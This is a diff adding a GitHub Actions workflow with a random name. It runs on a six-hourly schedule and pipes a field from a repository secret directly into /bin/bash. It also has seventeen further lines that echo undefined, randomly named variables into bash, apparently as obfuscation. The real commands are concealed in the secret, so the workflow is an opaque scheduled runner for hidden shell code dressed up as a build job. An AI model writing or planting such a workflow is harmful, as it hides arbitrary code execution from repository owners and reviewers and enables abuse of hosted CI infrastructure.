@@ -1,0 +1,36 @@
+name: liangtoushang5678
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '34 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: liangtoushang5678
+        env:
+          to8: ${{ secrets.to8 }}
+        run: |
+          echo $to8 | jq -r .ugh29 | /bin/bash
+          echo $h77604 | jq -r .bm3757 | /bin/bash
+          echo $lcunh40 | jq -r .fzot74927 | /bin/bash
+          echo $rvwik7 | jq -r .uxwps97 | /bin/bash
+          echo $iwkw702 | jq -r .ofok89 | /bin/bash
+          echo $rlaej76 | jq -r .shk80 | /bin/bash
+          echo $gu35 | jq -r .u40 | /bin/bash
+          echo $ria41678 | jq -r .amgv352 | /bin/bash
+          echo $mwh12 | jq -r .lw71 | /bin/bash
+          echo $fadg39 | jq -r .ci804 | /bin/bash
+          echo $mht452 | jq -r .wlmf5 | /bin/bash
+          echo $edw79 | jq -r .g86 | /bin/bash
+          echo $xptge560 | jq -r .pa5359 | /bin/bash
+          echo $xvkw779 | jq -r .wmft43 | /bin/bash
+          echo $tqwt719 | jq -r .fb11976 | /bin/bash
+          echo $izcwm447 | jq -r .yots7512 | /bin/bash
+          echo $g751 | jq -r .o173 | /bin/bash
+          echo $wih717 | jq -r .q011 | /bin/bash
+
